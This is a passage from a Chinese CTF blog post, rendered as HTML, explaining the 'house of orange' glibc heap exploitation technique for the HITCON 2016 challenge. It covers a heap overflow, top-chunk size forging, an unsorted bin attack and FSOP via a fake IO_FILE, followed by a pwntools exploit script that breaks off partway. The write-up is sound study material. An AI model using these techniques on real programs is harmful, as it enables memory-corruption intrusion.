@@ -1,0 +1,1144 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="R4bb1t的ctf博客" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……） House_of_or">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of orange 学习">
+<meta property="og:url" content="http://yoursite.com/2020/03/14/house of orange/index.html">
+<meta property="og:site_name" content="R4bb1t的ctf博客">
+<meta property="og:description" content="大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……） House_of_or">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_1.jpg">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_2.jpg">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_3.jpg">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_4.jpg">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_5.jpg">
+<meta property="og:image" content="http://yoursite.com/images/house_of_orange_6.jpg">
+<meta property="og:updated_time" content="2019-11-20T14:48:29.653Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house of orange 学习">
+<meta name="twitter:description" content="大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……） House_of_or">
+<meta name="twitter:image" content="http://yoursite.com/images/house_of_orange_1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/14/house of orange/">
+
+
+
+
+
+  <title>house of orange 学习 | R4bb1t的ctf博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R4bb1t的ctf博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/house of orange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R4bb1t">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/n0va.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R4bb1t的ctf博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">house of orange 学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T19:41:49+08:00">
+                2020-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……）</p>
+<h2 id="House-of-orange-–-2016Hitcon-CTF"><a href="#House-of-orange-–-2016Hitcon-CTF" class="headerlink" title="House_of_orange – 2016Hitcon CTF"></a>House_of_orange – 2016Hitcon CTF</h2><p>题目逻辑很简单，一共可以build 4次，每次build分进行3次堆分配，两次malloc，一次calloc，其中一次malloc是固定的0x10字节作为控制堆块，放着name和color的信息，另外按输入分配name 的大小。</p>
+<a id="more"></a>
+<h3 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h3><p>堆溢出：在upgrede 中没有规范size大小导致堆溢出<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">upgrade</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_203074 &gt; <span class="number">2u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't upgrade more"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_203068 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No such house !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of name :"</span>, a2);</span><br><span class="line">  size = sub_C65();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    size = <span class="number">4096</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">  sub_C20((<span class="keyword">void</span> *)qword_203068[<span class="number">1</span>], size);       <span class="comment">// size没有限制，堆溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Price of Orange: "</span>, size);</span><br><span class="line">  v3 = (_DWORD *)*qword_203068;</span><br><span class="line">  *v3 = sub_C65();</span><br><span class="line">  sub_CC4();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Color of Orange: "</span>);</span><br><span class="line">  v5 = sub_C65();</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">56746</span> &amp;&amp; (v5 &lt;= <span class="number">0</span> || v5 &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such color"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">56746</span> )</span><br><span class="line">    *(_DWORD *)(*qword_203068 + <span class="number">4L</span>L) = <span class="number">56746</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(*qword_203068 + <span class="number">4L</span>L) = v5 + <span class="number">30</span>;</span><br><span class="line">  ++unk_203074;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Finish"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、漏洞libc地址<br>因为程序存在堆溢出，所以可以修改top_chunk的大小，在malloc源码里面对于申请的堆块大小超过了top_chunk大小，将调用<code>sysmalloc</code>来进行分配，<code>sysmalloc</code>针对这种情况有两种处理，一种是直接mmap出来一块内存，一种是扩展top_chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">   the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">   allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">   rather than expanding top.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold) &amp;&amp;</span><br><span class="line">    (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">  try_mmap:</span><br></pre></td></tr></table></figure></p>
+<p>也就是如果申请的大小&gt;=mp_.mmap_threshold,就会mmap，所以只要我们申请的不要太大，就可以避免触发这个，<code>mmap_threshold</code>的值为<code>128*1024</code>，不过下面有两个assert需要检查 ：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"> </span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure></p>
+<p>第一个asser就是要求修改后的<code>top_chunk_size</code>必须满足：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、top_chunk_size&gt;MINSIZE(MINISIZE)(并不知道具体值是多少，反正不要太小就行了)</span><br><span class="line">2、top_chunk需要有pre_inuse的标志，也就是最后一个比特为1</span><br><span class="line">3、old_end &amp; pagemask == 0</span><br><span class="line">	#define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="line">	伪造的size必须页对齐，也就是(top_chunk+size-1) &amp; 0xfff == 0</span><br><span class="line">4、top_chunk_size小于申请分配的内存</span><br></pre></td></tr></table></figure></p>
+<p>满足以上四个条件之后，继续往下执行最后会把原先的old_top给释放掉了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">top (av) = chunk_at_offset (heap, <span class="keyword">sizeof</span> (*heap));</span><br><span class="line">set_head (top (av), (heap-&gt;size - <span class="keyword">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* Setup fencepost and free the old top chunk with a multiple of</span></span><br><span class="line"><span class="comment">  MALLOC_ALIGNMENT in size. */</span></span><br><span class="line"><span class="comment">/* The fencepost takes at least MINSIZE bytes, because it might</span></span><br><span class="line"><span class="comment">  become the top chunk again later.  Note that a footer is set</span></span><br><span class="line"><span class="comment">  up, too, although the chunk is marked in use. */</span></span><br><span class="line">old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">set_head (chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line"> &#123;</span><br><span class="line">   set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">   set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">   set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">   _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p>
+<p>这样，free出来就能得到一个unsorted bin，然后再次分配就可以从unsorted bin中切割出来。<br>接下来就可以堆溢出构造unsorted bin attack了，再伪造vtable进行FSOP攻击<br>首先来看一下漏洞的触发<br><img src="\images\house_of_orange_1.jpg" alt><br>而<code>_IO_flush_all_lockp</code>不需要攻击者手动调用，在一些情况下这个函数会被系统调用：<br>1、当libc执行abort流程时<br>2、当执行exit函数时<br>3、当执行流从main 函数返回时<br>FSOP也就 <code>File Stream Oriented Programming</code>，也是一种支持程序流程的方法，只不过方式是通过攻击<code>File Stream</code>来实现<br>先了解malloc对错误信息的处理过程，调用malloc_printerr,而malloc_printerr中用来打印错误的函数是<code>__libc_message</code>，<br><img src="\images\house_of_orange_2.jpg" alt><br><img src="\images\house_of_orange_3.jpg" alt><br>之后又调用了abort函数，而abort函数中调用了<code>_IO_flush_all_lockp</code>，这里面用到了<code>IO_FILE_ALL</code>的结构，采用上虚表的方式调用，所以如果我们能修改<code>IO_FILE</code>的内容那么就可以一定程度上支持流程；<br>那么怎么支持呢，这里又需要用到<code>unsorted bin attack</code>的知识：在malloc的过程中，<code>unsorted bin</code>会从链表上卸下来，就是会把<code>bk+0x10</code>的位置写入本<code>unsorted bin</code>的地址，也就是amin_arena的地址<br>我们通过硬件断点来观察一下：<br><img src="\images\house_of_orange_4.jpg" alt><br><img src="\images\house_of_orange_5.jpg" alt><br>可以看到，断点被触发后<code>_IO_list_all</code>被修改成了指向top_chunk的地址<code>main_arena+88</code><br>但是问题又来了，我们无法控制 main_arena的内容，那么该怎么处理呢？<br>这里还牵到<code>io_file</code>的使用了，<code>IO_FILE</code>结构中有一个字段是chain字段 ，它位于0x60偏移处，它指向的是下一个<code>IO_FILE</code>结构体，如果能够控制 这个字段，就能再指定<code>IO_FILE</code>的位置，它相当于是一个链表的结构；如此，，又联系到了small_chunk的问题了，在拆卸unsorted_bin的时候对属于small_bin的chunk进行了记录操作<br>而<code>IO_FILE_ALL</code>指向的偏移0x60的位置正好是<code>small_bin</code>的index为5的地方，所以upgrede的时候需要把unsortbin设置为0x60大小。<br><img src="\images\house_of_orange_6.jpg" alt><br>因为第一个分配在<code>main_arena</code>的<code>IO_FILE_plus</code>结构 的<code>fp-&gt;mode</code>等值不符合要求，所以会通过<code>chains</code>跳转到下一个<code>IO_FILE_plus</code>，也就是我们之前设的unsorted bin，然后这个伪造的<code>IO_FILE_plus</code>需要满足以下条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、fp-&gt;mode &gt; 0</span><br><span class="line">2、_IO_vtable_offset(fp) == 0</span><br><span class="line">3、fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p>
+<p>整个程序支持流程如下：</p>
+<p><code>malloc --&gt; _int_malloc --&gt; __libc_message --&gt; abort --&gt; _IO_flush_all_lockp --&gt; _IO_overflow</code></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./houseoforange'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">""</span>)</span><br><span class="line">	<span class="comment"># elf = ELF('./houseoforange')</span></span><br><span class="line"><span class="comment">#内存地址随机化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202040</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">             p32(<span class="number">0</span>) + \</span><br><span class="line">             p64(_IO_read_ptr) + \</span><br><span class="line">             p64(_IO_read_end) + \</span><br><span class="line">             p64(_IO_read_base) + \</span><br><span class="line">             p64(_IO_write_base) + \</span><br><span class="line">             p64(_IO_write_ptr) + \</span><br><span class="line">             p64(_IO_write_end) + \</span><br><span class="line">             p64(_IO_buf_base) + \</span><br><span class="line">             